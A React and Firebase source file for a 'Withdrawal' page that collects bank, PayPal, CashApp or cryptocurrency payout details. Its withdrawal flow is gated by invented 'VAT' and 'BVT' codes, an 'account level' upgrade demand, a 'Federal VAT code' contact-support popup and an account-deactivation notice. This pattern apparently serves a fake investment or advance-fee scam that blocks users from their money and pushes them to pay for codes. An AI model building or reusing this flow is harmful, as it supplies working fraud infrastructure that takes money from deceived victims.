import { useState, useEffect } from 'react';
import { auth, db } from '../firebaseconfig';
import { doc, onSnapshot, addDoc, collection, updateDoc } from 'firebase/firestore';
import { Dialog } from '@headlessui/react';
import Sidenav from '../components/Sidenav';

const Bank = () => {
  const [userData, setUserData] = useState(null);
  const [paymentMethod, setPaymentMethod] = useState('Bank');
  const [accountNumber, setAccountNumber] = useState('');
  const [accountHolderName, setAccountHolderName] = useState('');
  const [bankName, setBankName] = useState('');
  const [email, setEmail] = useState('');
  const [cryptoAddress, setCryptoAddress] = useState('');
  const [cryptoType, setCryptoType] = useState('BTC');
  const [amount, setAmount] = useState('');
  const [loading, setLoading] = useState(false);
  const [showUpgradePopup, setShowUpgradePopup] = useState(false);
  const [showCodePopup, setShowCodePopup] = useState(false);
  const [showAdminPopup, setShowAdminPopup] = useState(false);
  const [showBvtPopup, setShowBvtPopup] = useState(false);
  const [code, setCode] = useState('');
  const [bvtCode, setBvtCode] = useState('');
  const [showDeactivatedPopup, setShowDeactivatedPopup] = useState(false);

  // Real-time data fetching
  useEffect(() => {
    const user = auth.currentUser;
    if (!user) return;

    const unsubscribe = onSnapshot(doc(db, 'users', user.uid), (doc) => {
      if (doc.exists()) {
        setUserData(doc.data());
      }
    });

    return () => unsubscribe();
  }, []);

  const handleWithdraw = () => {
    if (!userData) return;

    // Add transaction enabled check first
    if (!userData.transactionEnabled) {
      setShowDeactivatedPopup(true);
      return;
    }

    if (parseFloat(amount) <= userData.accountBalance) {
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        setShowCodePopup(true);
      }, 2000);
    } else {
      alert('Insufficient balance for withdrawal.');
    }
  };

  const handleCodeSubmit = async () => {
    if (!userData) return;

    const user = auth.currentUser;
    if (user && String(userData.vatCode) === String(code)) {
      if (userData.accountLevel < 2) {
        setShowCodePopup(false);
        setShowUpgradePopup(true);
      } else {
        setShowBvtPopup(true);
      }
    } else {
      alert('Wrong VAT code. Please try again.');
    }
  };

  const handleBvtSubmit = async () => {
    if (!userData) return;

    const user = auth.currentUser;
    if (!user) return;

    try {
      // Validate BVT code
      if (String(userData.bvtCode) !== String(bvtCode)) {
        throw new Error('Invalid BVT code');
      }

      // Validate sufficient balance
      const withdrawalAmount = parseFloat(amount);
      if (isNaN(withdrawalAmount) || withdrawalAmount <= 0) {
        throw new Error('Invalid withdrawal amount');
      }

      if (withdrawalAmount > userData.accountBalance) {
        throw new Error('Insufficient balance for withdrawal');
      }

      // Update user balance
      const userRef = doc(db, 'users', user.uid);
      await updateDoc(userRef, {
        accountBalance: userData.accountBalance - withdrawalAmount
      });

      // Add to transaction history
      await addDoc(collection(db, 'transactions'), {
        uid: user.uid,
        type: 'withdrawal',
        amount: withdrawalAmount,
        status: 'pending',
        details: {
          paymentMethod,
          accountNumber,
          accountHolderName,
          bankName,
          email,
          cryptoAddress,
          cryptoType
        },
        timestamp: new Date()
      });

      // Clear form and show success
      alert('Withdrawal request pending approval');
      setShowBvtPopup(false);
      setAccountNumber('');
      setAccountHolderName('');
      setBankName('');
      setEmail('');
      setCryptoAddress('');
      setAmount('');
      setBvtCode('');

    } catch (error) {
      console.error('Withdrawal error:', error);
      alert(error.message || 'Withdrawal processing failed');
    }
  };

  const handleSetCode = () => {
    setShowAdminPopup(true);
  };

  return (
    <div className="container mx-auto p-4 text-gray-900 font-sans">
      <Sidenav />
      <div className="flex mb-6">
        <h2 className="text-2xl font-bold">Withdrawal</h2>
      </div>

      {/* Account Balance Display */}
      {userData && (
        <div className="mb-6 p-4 bg-blue-50 rounded-lg">
          <p className="text-lg font-semibold">
            Available Balance: {userData.country} {userData.accountBalance?.toFixed(2)}
          </p>
        </div>
      )}

      <div className="flex flex-col mx-auto w-full max-w-md">
        {/* Payment Method Selection */}
        <div className="mb-4">
          <label className="block mb-2 text-lg font-medium">Select Payment Method</label>
          <select
            value={paymentMethod}
            onChange={(e) => setPaymentMethod(e.target.value)}
            className="border border-gray-300 rounded w-full py-2 px-3"
          >
            <option value="Bank">Bank</option>
            <option value="PayPal">PayPal</option>
            <option value="CashApp">CashApp</option>
            <option value="Crypto">Cryptocurrency</option>
          </select>
        </div>

        {/* Conditional Inputs Based on Payment Method */}
        {paymentMethod === 'Bank' && (
          <>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Account Number</label>
              <input
                type="number"
                placeholder="Account Number"
                value={accountNumber}
                onChange={(e) => setAccountNumber(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Bank Name</label>
              <input
                type="text"
                placeholder="Bank Name"
                value={bankName}
                onChange={(e) => setBankName(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Account Holder Name</label>
              <input
                type="text"
                placeholder="Account Holder Name"
                value={accountHolderName}
                onChange={(e) => setAccountHolderName(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
          </>
        )}

        {(paymentMethod === 'PayPal' || paymentMethod === 'CashApp') && (
          <>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Email</label>
              <input
                type="email"
                placeholder="Email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Account Holder Name</label>
              <input
                type="text"
                placeholder="Account Holder Name"
                value={accountHolderName}
                onChange={(e) => setAccountHolderName(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
          </>
        )}

        {paymentMethod === 'Crypto' && (
          <>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Crypto Address</label>
              <input
                type="text"
                placeholder="Crypto Address"
                value={cryptoAddress}
                onChange={(e) => setCryptoAddress(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Select Cryptocurrency</label>
              <select
                value={cryptoType}
                onChange={(e) => setCryptoType(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              >
                <option value="BTC">Bitcoin (BTC)</option>
                <option value="ETH">Ethereum (ETH)</option>
                <option value="USDT">Tether (USDT)</option>
              </select>
            </div>
          </>
        )}

        {/* Amount Input */}
        <div className="mb-4">
          <label className="block mb-2 text-lg font-medium">Amount</label>
          <input
            type="number"
            placeholder="Amount"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            className="border border-gray-300 rounded w-full py-2 px-3"
          />
        </div>

        {/* Withdraw Button with Loading State */}
        <button
          onClick={handleWithdraw}
          className={`bg-blue-500 text-white py-2 px-4 rounded-lg w-full ${loading ? 'cursor-not-allowed opacity-75' : 'hover:bg-blue-600'
            }`}
          disabled={loading}
        >
          {loading ? 'Processing...' : 'Withdraw'}
        </button>
      </div>

      {/* Popup Modals */}
      {/* Upgrade Popup */}
      <Dialog open={showUpgradePopup} onClose={() => setShowUpgradePopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg max-w-md w-full mx-4">
            <Dialog.Title className="text-lg font-bold mb-4">Upgrade Required</Dialog.Title>
            <p className="mb-4">Your account level is too low for this transaction. Please upgrade to level 2.</p>
            <button
              onClick={() => setShowUpgradePopup(false)}
              className="w-full bg-blue-500 text-white py-2 px-4 rounded-lg hover:bg-blue-600"
            >
              OK
            </button>
          </div>
        </div>
      </Dialog>

      {/* VAT Code Popup */}
      <Dialog open={showCodePopup} onClose={() => setShowCodePopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg max-w-md w-full mx-4 text-center">
            {/* Lock Icon Container */}
            <div className="mx-auto mb-4 flex items-center justify-center">
              <div className="h-16 w-16 rounded-full bg-gray-100 flex items-center justify-center">
                <svg
                  className="h-8 w-8 text-gray-500"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                  />
                </svg>
              </div>
            </div>

            <Dialog.Title className="text-lg font-bold mb-4 text-gray-700">
              Enter VAT Code
            </Dialog.Title>
            <input
              type="text"
              placeholder="Enter VAT Code"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              className="border border-gray-300 rounded w-full py-2 px-3 mb-4 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            />
            <div className="flex gap-3">
              <button
                onClick={handleCodeSubmit}
                className="flex-1 bg-blue-500 text-white py-2 px-4 rounded-lg hover:bg-blue-600 transition-colors"
              >
                Submit
              </button>
              <button
                onClick={handleSetCode}
                className="flex-1 bg-gray-200 text-gray-700 py-2 px-4 rounded-lg hover:bg-gray-300 transition-colors"
              >
                Set Code
              </button>
            </div>
          </div>
        </div>
      </Dialog>

      {/* BVT Code Popup */}
      <Dialog open={showBvtPopup} onClose={() => setShowBvtPopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg max-w-md w-full mx-4 text-center">
            {/* Lock Icon Container */}
            <div className="mx-auto mb-4 flex items-center justify-center">
              <div className="h-16 w-16 rounded-full bg-gray-100 flex items-center justify-center">
                <svg
                  className="h-8 w-8 text-gray-500"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                  />
                </svg>
              </div>
            </div>

            <Dialog.Title className="text-lg font-bold mb-4 text-gray-700">
              Please enter your BVT codes
            </Dialog.Title>
            <input
              type="text"
              placeholder="Enter BVT Code"
              value={bvtCode}
              onChange={(e) => setBvtCode(e.target.value)}
              className="border border-gray-300 rounded w-full py-2 px-3 mb-4 focus:ring-2 focus:ring-purple-500 focus:border-transparent"
            />
            <button
              onClick={handleBvtSubmit}
              className="w-full bg-purple-600 text-white py-2 px-4 rounded-lg hover:bg-purple-700 transition-colors"
            >
              Confirm Withdrawal
            </button>
          </div>
        </div>
      </Dialog>

      {/* Admin Contact Popup */}
      <Dialog open={showAdminPopup} onClose={() => setShowAdminPopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg max-w-md w-full mx-4">
            <Dialog.Title className="text-lg font-bold mb-4">Contact Support</Dialog.Title>
            <p className="mb-4">The Federal VAT code is required before this transaction can be completed successfully.</p>
            <button
              onClick={() => setShowAdminPopup(false)}
              className="w-full bg-blue-500 text-white py-2 px-4 rounded-lg hover:bg-blue-600"
            >
              OK
            </button>
          </div>
        </div>
      </Dialog>
      {/* acccount deavtivated popup */}
      <Dialog open={showDeactivatedPopup} onClose={() => setShowDeactivatedPopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg max-w-md w-full mx-4 text-center">
            <div className="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-red-100 mb-4">
              <svg
                className="h-6 w-6 text-red-600"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
                />
              </svg>
            </div>
            <Dialog.Title className="text-lg font-bold mb-2 text-red-600">
              Account Deactivated
            </Dialog.Title>
            <p className="mb-4 text-gray-600">
              Your account has been deactivated. Please contact support to verify and reactivate your account.
            </p>
            <button
              onClick={() => setShowDeactivatedPopup(false)}
              className="w-full bg-red-600 text-white py-2 px-4 rounded-lg hover:bg-red-700 transition-colors"
            >
              OK
            </button>
          </div>
        </div>
      </Dialog>
    </div>
  );
};

export default Bank;